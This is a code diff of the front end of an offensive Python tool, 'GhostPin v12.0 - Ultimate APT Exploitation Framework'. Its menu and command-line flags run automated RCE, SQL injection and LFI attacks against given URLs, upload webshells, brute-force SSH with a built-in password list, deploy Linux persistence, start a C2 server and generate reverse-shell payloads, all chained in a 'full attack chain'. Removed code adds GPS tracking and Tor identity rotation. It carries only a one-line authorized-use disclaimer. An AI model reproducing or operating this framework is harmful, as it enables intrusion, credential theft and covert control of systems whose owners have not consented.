-{Colors.GREEN}[2]{Colors.WHITE} Start C2 Server
-{Colors.GREEN}[3]{Colors.WHITE} Run APT Reconnaissance
-{Colors.GREEN}[4]{Colors.WHITE} Build & Execute Attack Chain
-{Colors.GREEN}[5]{Colors.WHITE} Deploy Persistence
-{Colors.GREEN}[6]{Colors.WHITE} Deploy Webshell
-{Colors.GREEN}[7]{Colors.WHITE} View GPS Data
-{Colors.GREEN}[8]{Colors.WHITE} Generate Report
-{Colors.GREEN}[9]{Colors.WHITE} Tor/Proxy Settings
-{Colors.RED}[10]{Colors.WHITE} Exit
+{Colors.GREEN}[1]  APT Reconnaissance
+{Colors.GREEN}[2]  RCE Exploitation
+{Colors.GREEN}[3]  SQL Injection Exploitation
+{Colors.GREEN}[4]  LFI Exploitation
+{Colors.GREEN}[5]  File Upload / Webshell
+{Colors.GREEN}[6]  SSH Bruteforce
+{Colors.GREEN}[7]  Deploy Persistence
+{Colors.GREEN}[8]  Start C2 Server
+{Colors.GREEN}[9]  Generate Payload
+{Colors.RED}[10] Full Attack Chain
+{Colors.PURPLE}[11] Show Results
+{Colors.PURPLE}[12] Generate Report
+{Colors.RED}[13] Exit
 """)
     
-    def _run_apt_recon(self):
-        target = input(f"{Colors.CYAN}[>] Target domain/IP: {Colors.WHITE}").strip()
-        if not target:
+    def apt_recon(self):
+        target = input("[>] Target domain/IP: ").strip()
+        if target:
+            self.current_target = target
+            recon = APTReconnaissance(target)
+            self.current_profile = recon.full_recon()
+            
+            filename = f"profile_{target}_{int(time.time())}.json"
+            with open(filename, 'w') as f:
+                json.dump(self.current_profile.__dict__, f, indent=2, default=str)
+            cprint(f"[+] Profile saved to {filename}", Colors.GREEN)
+    
+    def rce_exploit(self):
+        if not self.current_profile:
+            cprint("[!] Run reconnaissance first", Colors.YELLOW)
             return
         
-        cprint("[*] Running APT reconnaissance...", Colors.BLUE)
-        recon = APTReconnaissance(target)
-        self.current_profile = recon.full_recon()
+        url = input("[>] Target URL: ").strip()
+        param = input("[>] Parameter (cmd): ").strip() or "cmd"
+        cmd = input("[>] Command (id): ").strip() or "id"
         
-        # Save profile
-        filename = f"profile_{target}_{int(time.time())}.json"
-        with open(filename, 'w') as f:
-            json.dump(self.current_profile.to_dict(), f, indent=2)
-        cprint(f"[+] Profile saved to {filename}", Colors.GREEN)
+        exploit = RealExploitationEngine(self.current_profile)
+        result = exploit.exploit_rce(url, param, cmd)
+        self.results.append(result.__dict__)
         
-        # Display summary
-        profile = self.current_profile
-        cprint(f"\n[+] Reconnaissance Summary:", Colors.GREEN)
-        cprint(f"  Subdomains: {len(profile.subdomains)}", Colors.DIM)
-        cprint(f"  Open Ports: {len(profile.open_ports)}", Colors.DIM)
-        cprint(f"  Services: {len(profile.services)}", Colors.DIM)
-        cprint(f"  Web Apps: {len(profile.web_applications)}", Colors.DIM)
-        cprint(f"  Cloud Resources: {len(profile.cloud_resources)}", Colors.DIM)
-        
-        if profile.vulnerabilities:
-            cprint(f"  Potential Vulnerabilities: {len(profile.vulnerabilities)}", Colors.DIM)
+        if result.success:
+            cprint(f"[+] RCE Successful!", Colors.GREEN)
+            cprint(f"    Output: {result.data.get('output', '')[:200]}", Colors.DIM)
+        else:
+            cprint("[-] RCE Failed", Colors.RED)
     
-    def _build_attack_chain(self):
+    def sqli_exploit(self):
         if not self.current_profile:
-            target = input(f"{Colors.CYAN}[>] Target: {Colors.WHITE}").strip()
-            if not target:
-                return
-            cprint("[*] Running reconnaissance first...", Colors.BLUE)
-            recon = APTReconnaissance(target)
-            self.current_profile = recon.full_recon()
+            cprint("[!] Run reconnaissance first", Colors.YELLOW)
+            return
         
-        exploit = RealExploitEngine(self.current_profile)
-        chain = exploit.build_attack_chain()
+        url = input("[>] Target URL: ").strip()
+        param = input("[>] Parameter (id): ").strip() or "id"
         
-        cprint(f"\n[+] Attack Chain ({len(chain)} vectors):", Colors.GREEN)
-        for i, vector in enumerate(chain, 1):
-            severity = vector.get('severity', 'unknown')
-            color = Colors.RED if severity == 'critical' else Colors.YELLOW if severity == 'high' else Colors.WHITE
-            cprint(f"\n{color}[{i}] {vector.get('technique', 'Unknown')}{Colors.WHITE}")
-            cprint(f"    CVE: {vector.get('cve', 'N/A')}", Colors.DIM)
-            cprint(f"    Severity: {severity}", Colors.DIM)
-            cprint(f"    Confidence: {vector.get('confidence', 0.5)}", Colors.DIM)
+        exploit = RealExploitationEngine(self.current_profile)
+        result = exploit.exploit_sqli(url, param)
+        self.results.append(result.__dict__)
         
-        execute = input(f"\n{Colors.YELLOW}[>] Execute attacks? (y/N): {Colors.WHITE}").strip().lower()
-        if execute == 'y':
-            for vector in chain:
-                # Execute real attack based on type
-                if 'rce' in vector.get('technique', '').lower():
-                    result = exploit.exploit_rce(
-                        vector.get('url', f"http://{self.current_profile.target}"),
-                        'cmd', 'id'
-                    )
-                elif 'sqli' in vector.get('technique', '').lower():
-                    result = exploit.exploit_sqli(
-                        vector.get('url', f"http://{self.current_profile.target}"),
-                        'id'
-                    )
-                else:
-                    result = exploit.exploit_lfi(
-                        vector.get('url', f"http://{self.current_profile.target}"),
-                        'file'
-                    )
-                
-                if result.get('success'):
-                    cprint(f"[+] {vector.get('technique')} - SUCCESS", Colors.GREEN)
-                    if result.get('output'):
-                        cprint(f"    Output: {result['output'][:200]}", Colors.DIM)
-                else:
-                    cprint(f"[-] {vector.get('technique')} - FAILED", Colors.RED)
+        if result.success:
+            cprint(f"[+] SQLi Successful!", Colors.GREEN)
+            cprint(f"    Data: {result.data.get('response', '')[:200]}", Colors.DIM)
+        else:
+            cprint("[-] SQLi Failed", Colors.RED)
     
-    def _deploy_persistence(self):
+    def lfi_exploit(self):
         if not self.current_profile:
-            target = input(f"{Colors.CYAN}[>] Target: {Colors.WHITE}").strip()
-            if not target:
-                return
-            cprint("[*] Running reconnaissance first...", Colors.BLUE)
-            recon = APTReconnaissance(target)
-            self.current_profile = recon.full_recon()
+            cprint("[!] Run reconnaissance first", Colors.YELLOW)
+            return
         
-        username = input(f"{Colors.CYAN}[>] Username: {Colors.WHITE}").strip()
-        password = input(f"{Colors.CYAN}[>] Password: {Colors.WHITE}").strip()
-        payload = input(f"{Colors.CYAN}[>] Payload path: {Colors.WHITE}").strip() or "/bin/bash"
+        url = input("[>] Target URL: ").strip()
+        param = input("[>] Parameter (file): ").strip() or "file"
+        
+        exploit = RealExploitationEngine(self.current_profile)
+        result = exploit.exploit_lfi(url, param)
+        self.results.append(result.__dict__)
+        
+        if result.success:
+            cprint(f"[+] LFI Successful!", Colors.GREEN)
+            cprint(f"    File: {result.data.get('file', '')}", Colors.DIM)
+            cprint(f"    Content: {result.data.get('content', '')[:200]}", Colors.DIM)
+        else:
+            cprint("[-] LFI Failed", Colors.RED)
+    
+    def file_upload(self):
+        if not self.current_profile:
+            cprint("[!] Run reconnaissance first", Colors.YELLOW)
+            return
+        
+        target = input("[>] Target IP: ").strip() or self.current_profile.target
+        port = int(input("[>] Port (80): ").strip() or "80")
+        
+        exploit = RealExploitationEngine(self.current_profile)
+        result = exploit.deploy_webshell(target, port)
+        self.results.append(result.__dict__)
+        
+        if result.success:
+            cprint(f"[+] Webshell deployed!", Colors.GREEN)
+            cprint(f"    URL: {result.data.get('url', '')}", Colors.CYAN)
+        else:
+            cprint("[-] Webshell deployment failed", Colors.RED)
+    
+    def ssh_bruteforce(self):
+        if not self.current_profile:
+            cprint("[!] Run reconnaissance first", Colors.YELLOW)
+            return
+        
+        target = input("[>] Target IP: ").strip() or self.current_profile.target
+        username = input("[>] Username: ").strip() or "root"
+        
+        wordlist_file = input("[>] Wordlist file: ").strip()
+        if not wordlist_file or not os.path.exists(wordlist_file):
+            wordlist = ['password', '123456', 'admin', 'root', 'password123']
+            cprint("[!] Using default wordlist", Colors.YELLOW)
+        else:
+            with open(wordlist_file, 'r') as f:
+                wordlist = [line.strip() for line in f if line.strip()]
+        
+        exploit = RealExploitationEngine(self.current_profile)
+        result = exploit.exploit_ssh_bruteforce(target, username, wordlist)
+        self.results.append(result.__dict__)
+        
+        if result.success:
+            cprint(f"[+] SSH Credentials found!", Colors.GREEN)
+            cprint(f"    {result.data.get('username')}:{result.data.get('password')}", Colors.RED)
+        else:
+            cprint("[-] SSH Bruteforce failed", Colors.RED)
+    
+    def deploy_persistence(self):
+        if not self.current_profile:
+            cprint("[!] Run reconnaissance first", Colors.YELLOW)
+            return
+        
+        target = input("[>] Target: ").strip() or self.current_profile.target
+        username = input("[>] Username: ").strip()
+        password = input("[>] Password: ").strip()
+        payload = input("[>] Payload path: ").strip() or "/bin/bash"
         
         if not username:
             cprint("[-] Username required", Colors.RED)
             return
         
-        platform_type = input(f"{Colors.CYAN}[>] Platform (linux/windows/all): {Colors.WHITE}").strip().lower() or "linux"
-        
-        if platform_type in ['linux', 'all']:
-            result = self.persistence.deploy_linux(
-                self.current_profile.target, username, password, payload
-            )
-            cprint(f"\n[+] Linux persistence: {len(result.get('methods', []))} methods", Colors.GREEN)
-        
-        if platform_type in ['windows', 'all']:
-            cprint("[*] Windows persistence...", Colors.BLUE)
-            # Windows persistence would be implemented similarly
-    
-    def _deploy_webshell(self):
-        if not self.current_profile:
-            target = input(f"{Colors.CYAN}[>] Target: {Colors.WHITE}").strip()
-            if not target:
-                return
-            cprint("[*] Running reconnaissance first...", Colors.BLUE)
-            recon = APTReconnaissance(target)
-            self.current_profile = recon.full_recon()
-        
-        port = int(input(f"{Colors.CYAN}[>] Port (80): {Colors.WHITE}").strip() or "80")
-        
-        exploit = RealExploitEngine(self.current_profile)
-        result = exploit.upload_webshell(self.current_profile.target, port)
+        persistence = PersistenceEngine(self.c2_server)
+        result = persistence.deploy_linux(target, username, password, payload)
+        self.results.append(result)
         
         if result['success']:
-            cprint(f"[+] Webshell deployed: {result['url']}", Colors.GREEN)
+            cprint(f"[+] Persistence deployed with {len(result['methods'])} methods", Colors.GREEN)
         else:
-            cprint("[-] Webshell deployment failed", Colors.RED)
+            cprint("[-] Persistence deployment failed", Colors.RED)
     
-    def _view_gps_data(self):
-        if not self.tracking_server or not self.tracking_server.tracking_data:
-            cprint("[!] No GPS data available", Colors.YELLOW)
-            return
-        
-        data = self.tracking_server.tracking_data
-        stats = self.tracking_server.stats
-        
-        cprint(f"\n[+] GPS Tracking Data (Total: {stats['total']}, Unique: {len(stats['unique'])})", Colors.GREEN)
-        
-        for i, record in enumerate(data[-10:], 1):
-            lat = record.get('lat', 'N/A')
-            lng = record.get('lng', 'N/A')
-            token = record.get('token', 'N/A')
-            ip = record.get('source_ip', 'N/A')
-            
-            cprint(f"\n  [{i}] Token: {token}", Colors.YELLOW)
-            cprint(f"      Location: {lat}, {lng}", Colors.CYAN)
-            cprint(f"      IP: {ip}", Colors.DIM)
-            
-            if lat != 'N/A' and lng != 'N/A':
-                maps = f"https://www.google.com/maps?q={lat},{lng}"
-                cprint(f"      Map: {maps}", Colors.BLUE)
+    def start_c2(self):
+        port = int(input("[>] Port (8080): ").strip() or "8080")
+        self.c2_server.port = port
+        self.c2_server.start()
+        cprint("[+] C2 Server running", Colors.GREEN)
     
-    def _generate_report(self):
+    def generate_payload(self):
+        print("\nPayload types:")
+        payload_types = list(self.payload_gen.payloads.keys())
+        for i, pt in enumerate(payload_types, 1):
+            print(f"  {i}. {pt}")
+        
+        choice = input("[>] Select payload type: ").strip()
+        try:
+            idx = int(choice) - 1
+            if 0 <= idx < len(payload_types):
+                payload_type = payload_types[idx]
+                
+                if 'shell' in payload_type or 'stager' in payload_type:
+                    host = input("[>] LHOST: ").strip() or "127.0.0.1"
+                    port = int(input("[>] LPORT (4444): ").strip() or "4444")
+                    payload = self.payload_gen.generate(payload_type, host, port)
+                else:
+                    payload = self.payload_gen.generate(payload_type)
+                
+                if payload:
+                    filename = f"payload_{payload_type}_{int(time.time())}.txt"
+                    with open(filename, 'w') as f:
+                        f.write(payload)
+                    cprint(f"[+] Payload saved to {filename}", Colors.GREEN)
+                    cprint(f"    Preview: {payload[:200]}...", Colors.DIM)
+                else:
+                    cprint("[-] Payload generation failed", Colors.RED)
+        except:
+            cprint("[-] Invalid selection", Colors.RED)
+    
+    def full_attack_chain(self):
+        cprint("\n[FULL] Executing Full Attack Chain", Colors.RED, bold=True)
+        cprint("="*70, Colors.RED)
+        
         if not self.current_profile:
-            cprint("[!] Run reconnaissance first", Colors.RED)
+            target = input("[>] Target: ").strip()
+            if not target:
+                cprint("[-] Target required", Colors.RED)
+                return
+            
+            cprint("[*] Running reconnaissance...", Colors.BLUE)
+            recon = APTReconnaissance(target)
+            self.current_profile = recon.full_recon()
+            self.current_target = target
+        
+        results = []
+        
+        # Phase 1: Web attacks
+        for app in self.current_profile.web_applications[:3]:
+            url = app['url']
+            
+            # RCE
+            cprint("[*] Attempting RCE...", Colors.DIM)
+            exploit = RealExploitationEngine(self.current_profile)
+            rce_result = exploit.exploit_rce(url, 'cmd', 'id')
+            results.append(rce_result.__dict__)
+            if rce_result.success:
+                cprint("[+] RCE successful!", Colors.GREEN)
+            
+            # SQLi
+            cprint("[*] Attempting SQLi...", Colors.DIM)
+            sqli_result = exploit.exploit_sqli(url, 'id')
+            results.append(sqli_result.__dict__)
+            if sqli_result.success:
+                cprint("[+] SQLi successful!", Colors.GREEN)
+            
+            # LFI
+            cprint("[*] Attempting LFI...", Colors.DIM)
+            lfi_result = exploit.exploit_lfi(url, 'file')
+            results.append(lfi_result.__dict__)
+            if lfi_result.success:
+                cprint("[+] LFI successful!", Colors.GREEN)
+        
+        # Phase 2: Upload webshell
+        cprint("[*] Attempting webshell upload...", Colors.DIM)
+        upload_result = exploit.deploy_webshell(self.current_profile.target, 80)
+        results.append(upload_result.__dict__)
+        
+        # Phase 3: Persistence
+        if not results:
+            cprint("[-] No successful attacks, skipping persistence", Colors.RED)
+        else:
+            cprint("[*] Attempting persistence...", Colors.DIM)
+            persistence = PersistenceEngine(self.c2_server)
+            persist_result = persistence.deploy_linux(
+                self.current_profile.target,
+                "root", "password", "/bin/bash"
+            )
+            results.append(persist_result)
+        
+        self.results.extend(results)
+        
+        cprint("\n[+] Full Attack Chain Complete", Colors.GREEN)
+        success_count = sum(1 for r in results if r.get('success', False))
+        cprint(f"[+] Successful attacks: {success_count}/{len(results)}", Colors.CYAN)
+    
+    def show_results(self):
+        if not self.results:
+            cprint("[!] No results", Colors.YELLOW)
             return
         
-        # Build report data
-        data = {
-            'timestamp': datetime.now().isoformat(),
+        print("\n" + "="*70)
+        cprint(" GHOSTPIN RESULTS", Colors.PURPLE, bold=True)
+        print("="*70)
+        
+        for i, result in enumerate(self.results, 1):
+            if isinstance(result, dict):
+                status = "SUCCESS" if result.get('success') else "FAILED"
+                color = Colors.GREEN if result.get('success') else Colors.RED
+                method = result.get('method', 'Unknown')
+                severity = result.get('severity', 'MEDIUM')
+                cprint(f"[{i}] {method} -> {status}", color)
+                cprint(f"    Severity: {severity}", Colors.YELLOW)
+                if result.get('success') and result.get('data'):
+                    data = result['data']
+                    if isinstance(data, dict):
+                        for key, value in data.items():
+                            cprint(f"    {key}: {str(value)[:100]}", Colors.DIM)
+        print("="*70)
+    
+    def generate_report(self):
+        if not self.results:
+            cprint("[!] No results to report", Colors.YELLOW)
+            return
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"ghostpin_report_{timestamp}.json"
+        
+        report = {
             'version': VERSION,
             'author': AUTHOR,
-            'target': self.current_profile.target,
-            'ip_addresses': self.current_profile.ip_addresses,
-            'subdomains': self.current_profile.subdomains,
-            'open_ports': self.current_profile.open_ports,
-            'services': self.current_profile.services,
-            'technologies': self.current_profile.technologies,
-            'vulnerabilities': self.current_profile.vulnerabilities,
-            'attack_surface': self.current_profile.attack_surface,
-            'gps_data': self.tracking_server.tracking_data if self.tracking_server else [],
-            'c2_beacons': self.c2_server.beacons if self.c2_server else []
+            'timestamp': datetime.now().isoformat(),
+            'target': self.current_target,
+            'profile': self.current_profile.__dict__ if self.current_profile else {},
+            'results': self.results
         }
         
-        # Generate reports
-        self.reporting.generate_pdf(data, "apt_report.pdf")
-        self.reporting.generate_html(data, "apt_report.html")
-        self.reporting.generate_json(data, "apt_report.json")
+        with open(filename, 'w') as f:
+            json.dump(report, f, indent=2, default=str)
         
-        cprint("[+] Reports generated in all formats", Colors.GREEN)
-    
-    def _tor_settings(self):
-        print(f"""
-{Colors.BLUE}{'='*60}{Colors.WHITE}
-{Colors.BOLD}Tor/Proxy Settings{Colors.WHITE}
-{Colors.BLUE}{'='*60}{Colors.WHITE}
-Tor Available: {self.proxy_manager.tor_available}
-Proxies Loaded: {len(self.proxy_manager.proxies)}
-""")
-        
-        print("[1] Renew Tor Identity")
-        print("[2] Load Proxies from File")
-        print("[3] Add Proxy")
-        print("[4] Back")
-        
-        choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
-        
-        if choice == '1':
-            if self.proxy_manager.renew_tor_identity():
-                cprint("[+] Tor identity renewed", Colors.GREEN)
-            else:
-                cprint("[-] Tor identity renewal failed", Colors.RED)
-        elif choice == '2':
-            filename = input(f"{Colors.CYAN}[>] Proxy file: {Colors.WHITE}").strip()
-            self.proxy_manager.load_proxies_from_file(filename)
-        elif choice == '3':
-            proxy = input(f"{Colors.CYAN}[>] Proxy (ip:port): {Colors.WHITE}").strip()
-            self.proxy_manager.add_proxy(proxy)
-            cprint("[+] Proxy added", Colors.GREEN)
+        cprint(f"[+] Report saved: {filename}", Colors.GREEN)
     
     def run(self):
-        self._banner()
+        print_banner()
+        cprint("[*] GhostPin v12.0 - Ultimate APT Exploitation Framework", Colors.CYAN)
+        cprint("[*] APT Grade | Zero Trace | Full Spectrum Attack", Colors.DIM)
+        cprint("[!] WARNING: This tool is for authorized security testing only", Colors.RED)
+        cprint("[!] You are fully accountable for your actions", Colors.RED)
         
         while self.running:
-            self._menu()
-            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
+            self.show_menu()
+            choice = input(f"{Colors.CYAN}[>] Select (1-13): {Colors.WHITE}").strip()
             
             if choice == '1':
-                port = int(input(f"{Colors.CYAN}[>] Port (443): {Colors.WHITE}").strip() or "443")
-                ssl_enabled = input(f"{Colors.CYAN}[>] Enable SSL? (Y/n): {Colors.WHITE}").strip().lower() != 'n'
-                self.tracking_server = TrackingServer()
-                self.tracking_server.start(port, ssl_enabled)
-            
+                self.apt_recon()
             elif choice == '2':
-                port = int(input(f"{Colors.CYAN}[>] Port (8080): {Colors.WHITE}").strip() or "8080")
-                self.c2_server.port = port
-                self.c2_server.start()
-            
+                self.rce_exploit()
             elif choice == '3':
-                self._run_apt_recon()
-            
+                self.sqli_exploit()
             elif choice == '4':
-                self._build_attack_chain()
-            
+                self.lfi_exploit()
             elif choice == '5':
-                self._deploy_persistence()
-            
+                self.file_upload()
             elif choice == '6':
-                self._deploy_webshell()
-            
+                self.ssh_bruteforce()
             elif choice == '7':
-                self._view_gps_data()
-            
+                self.deploy_persistence()
             elif choice == '8':
-                self._generate_report()
-            
+                self.start_c2()
             elif choice == '9':
-                self._tor_settings()
-            
+                self.generate_payload()
             elif choice == '10':
-                cprint("[*] Shutting down...", Colors.RED)
+                self.full_attack_chain()
+            elif choice == '11':
+                self.show_results()
+            elif choice == '12':
+                self.generate_report()
+            elif choice == '13':
+                cprint("[*] Shutting down GhostPin...", Colors.GREEN)
                 self.running = False
                 if self.c2_server:
                     self.c2_server.stop()
-                if self.tracking_server:
-                    self.tracking_server.stop()
-                cprint("[+] Goodbye!", Colors.GREEN)
-                sys.exit(0)
-            
+                break
             else:
-                cprint("[-] Invalid option", Colors.RED)
+                cprint("[-] Invalid selection", Colors.RED)
 
 #===============================================================================
 # MAIN
@@ -1462,43 +1421,132 @@ Proxies Loaded: {len(self.proxy_manager.proxies)}
 
 def main():
     parser = argparse.ArgumentParser(
-        description=f"GhostPin v{VERSION} - Enhanced APT-Grade Framework",
-        epilog=f"Author: {AUTHOR} | License: {LICENSE}"
+        description="GhostPin v12.0 - Ultimate APT Exploitation Framework",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+EXAMPLES:
+  # Interactive Mode
+  python3 ghostpin_v12.py
+  
+  # Reconnaissance
+  python3 ghostpin_v12.py --recon example.com
+  
+  # RCE Exploit
+  python3 ghostpin_v12.py --rce https://example.com --cmd id
+  
+  # SQL Injection
+  python3 ghostpin_v12.py --sqli https://example.com/page?id=1
+  
+  # LFI Exploit
+  python3 ghostpin_v12.py --lfi https://example.com/file?file=index
+  
+  # Full Attack Chain
+  python3 ghostpin_v12.py --attack example.com
+  
+  # Start C2 Server
+  python3 ghostpin_v12.py --c2 --port 8080
+        """
     )
     
-    parser.add_argument("--server", action="store_true", help="Start tracking server")
-    parser.add_argument("--c2", action="store_true", help="Start C2 server")
-    parser.add_argument("--port", type=int, default=8080, help="Server port")
-    parser.add_argument("--recon", help="Run APT reconnaissance")
-    parser.add_argument("--attack", help="Build and execute attack chain")
+    parser.add_argument("--recon", help="Run reconnaissance on target")
+    parser.add_argument("--rce", help="RCE exploit URL")
+    parser.add_argument("--cmd", default="id", help="Command for RCE")
+    parser.add_argument("--sqli", help="SQL injection URL")
+    parser.add_argument("--lfi", help="LFI URL")
+    parser.add_argument("--upload", help="File upload target")
+    parser.add_argument("--ssh", help="SSH bruteforce target")
+    parser.add_argument("--username", default="root", help="SSH username")
+    parser.add_argument("--wordlist", help="SSH wordlist file")
     parser.add_argument("--persist", help="Deploy persistence on target")
-    parser.add_argument("--webshell", help="Deploy webshell on target")
-    parser.add_argument("--report", help="Generate report for target")
-    parser.add_argument("--tor", action="store_true", help="Enable Tor")
-    parser.add_argument("--output", help="Output file")
+    parser.add_argument("--c2", action="store_true", help="Start C2 server")
+    parser.add_argument("--port", type=int, default=8080, help="Port for C2 server")
+    parser.add_argument("--payload", help="Generate payload type")
+    parser.add_argument("--attack", help="Full attack chain on target")
+    parser.add_argument("--report", action="store_true", help="Generate report")
+    parser.add_argument("-o", "--output", help="Output file")
     
     args = parser.parse_args()
     
-    if args.tor:
-        proxy = ProxyManager()
-        if proxy.tor_available:
-            cprint("[+] Tor enabled", Colors.GREEN)
-        else:
-            cprint("[!] Tor not available", Colors.RED)
+    if args.recon:
+        print_banner()
+        recon = APTReconnaissance(args.recon)
+        profile = recon.full_recon()
+        output = args.output or f"profile_{args.recon}_{int(time.time())}.json"
+        with open(output, 'w') as f:
+            json.dump(profile.__dict__, f, indent=2, default=str)
+        cprint(f"[+] Profile saved to {output}", Colors.GREEN)
+        sys.exit(0)
     
-    if args.server:
-        server = TrackingServer()
-        server.start(args.port or 443, ssl_enabled=True)
-        cprint("[+] Server running. Press Ctrl+C to stop", Colors.GREEN)
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            server.stop()
+    if args.rce:
+        print_banner()
+        profile = APTTarget(target=args.rce)
+        exploit = RealExploitationEngine(profile)
+        result = exploit.exploit_rce(args.rce, 'cmd', args.cmd)
+        print(json.dumps(result.__dict__, indent=2, default=str))
+        sys.exit(0)
+    
+    if args.sqli:
+        print_banner()
+        profile = APTTarget(target=args.sqli)
+        exploit = RealExploitationEngine(profile)
+        result = exploit.exploit_sqli(args.sqli, 'id')
+        print(json.dumps(result.__dict__, indent=2, default=str))
+        sys.exit(0)
+    
+    if args.lfi:
+        print_banner()
+        profile = APTTarget(target=args.lfi)
+        exploit = RealExploitationEngine(profile)
+        result = exploit.exploit_lfi(args.lfi, 'file')
+        print(json.dumps(result.__dict__, indent=2, default=str))
+        sys.exit(0)
+    
+    if args.upload:
+        print_banner()
+        profile = APTTarget(target=args.upload)
+        exploit = RealExploitationEngine(profile)
+        result = exploit.deploy_webshell(args.upload, 80)
+        print(json.dumps(result.__dict__, indent=2, default=str))
+        sys.exit(0)
+    
+    if args.ssh:
+        print_banner()
+        profile = APTTarget(target=args.ssh)
+        exploit = RealExploitationEngine(profile)
+        
+        if args.wordlist and os.path.exists(args.wordlist):
+            with open(args.wordlist, 'r') as f:
+                wordlist = [line.strip() for line in f if line.strip()]
+        else:
+            wordlist = ['password', '123456', 'admin', 'root', 'password123']
+        
+        result = exploit.exploit_ssh_bruteforce(args.ssh, args.username, wordlist)
+        print(json.dumps(result.__dict__, indent=2, default=str))
+        sys.exit(0)
+    
+    if args.attack:
+        print_banner()
+        recon = APTReconnaissance(args.attack)
+        profile = recon.full_recon()
+        
+        exploit = RealExploitationEngine(profile)
+        
+        results = []
+        for app in profile.web_applications[:3]:
+            url = app['url']
+            rce_result = exploit.exploit_rce(url, 'cmd', 'id')
+            results.append(rce_result.__dict__)
+            sqli_result = exploit.exploit_sqli(url, 'id')
+            results.append(sqli_result.__dict__)
+            lfi_result = exploit.exploit_lfi(url, 'file')
+            results.append(lfi_result.__dict__)
+        
+        print(json.dumps(results, indent=2, default=str))
         sys.exit(0)
     
     if args.c2:
-        c2 = C2Server(port=args.port or 8080)
+        print_banner()
+        c2 = C2Server(port=args.port)
         c2.start()
         try:
             while True:
@@ -1507,69 +1555,27 @@ def main():
             c2.stop()
         sys.exit(0)
     
-    if args.recon:
-        recon = APTReconnaissance(args.recon)
-        profile = recon.full_recon()
-        
-        output = args.output or f"profile_{args.recon}_{int(time.time())}.json"
-        with open(output, 'w') as f:
-            json.dump(profile.to_dict(), f, indent=2)
-        cprint(f"[+] Profile saved to {output}", Colors.GREEN)
-        sys.exit(0)
-    
-    if args.attack:
-        recon = APTReconnaissance(args.attack)
-        profile = recon.full_recon()
-        
-        exploit = RealExploitEngine(profile)
-        chain = exploit.build_attack_chain()
-        
-        for vector in chain[:3]:
-            result = exploit.exploit_rce(f"http://{args.attack}", 'cmd', 'id')
-            if result['success']:
-                cprint(f"[+] RCE successful: {result['output'][:200]}", Colors.GREEN)
-        sys.exit(0)
-    
-    if args.persist:
-        persistence = EnhancedPersistence()
-        parts = args.persist.split(',')
-        if len(parts) >= 3:
-            target, username, password = parts[0], parts[1], parts[2]
-            payload = parts[3] if len(parts) > 3 else "/bin/bash"
-            result = persistence.deploy_linux(target, username, password, payload)
-            print(json.dumps(result, indent=2))
-        sys.exit(0)
-    
-    if args.webshell:
-        parts = args.webshell.split(',')
-        if len(parts) >= 1:
-            target = parts[0]
-            port = int(parts[1]) if len(parts) > 1 else 80
-            exploit = RealExploitEngine(APTTargetProfile(target))
-            result = exploit.upload_webshell(target, port)
-            print(json.dumps(result, indent=2))
+    if args.payload:
+        print_banner()
+        payload_gen = ExploitPayloadGenerator()
+        payload = payload_gen.generate(args.payload)
+        if payload:
+            filename = args.output or f"payload_{args.payload}_{int(time.time())}.txt"
+            with open(filename, 'w') as f:
+                f.write(payload)
+            cprint(f"[+] Payload saved to {filename}", Colors.GREEN)
+        else:
+            cprint("[-] Payload generation failed", Colors.RED)
         sys.exit(0)
     
     if args.report:
-        recon = APTReconnaissance(args.report)
-        profile = recon.full_recon()
-        
-        reporting = EnhancedReporting()
-        data = profile.to_dict()
-        data['timestamp'] = datetime.now().isoformat()
-        data['version'] = VERSION
-        data['author'] = AUTHOR
-        
-        reporting.generate_pdf(data, f"report_{args.report}.pdf")
-        reporting.generate_html(data, f"report_{args.report}.html")
-        reporting.generate_json(data, f"report_{args.report}.json")
-        
-        cprint("[+] Reports generated", Colors.GREEN)
+        tool = GhostPinUltimate()
+        tool.generate_report()
         sys.exit(0)
     
     # Interactive mode
-    app = GhostPinEnhanced()
-    app.run()
+    tool = GhostPinUltimate()
+    tool.run()
 
 if __name__ == "__main__":
     try:
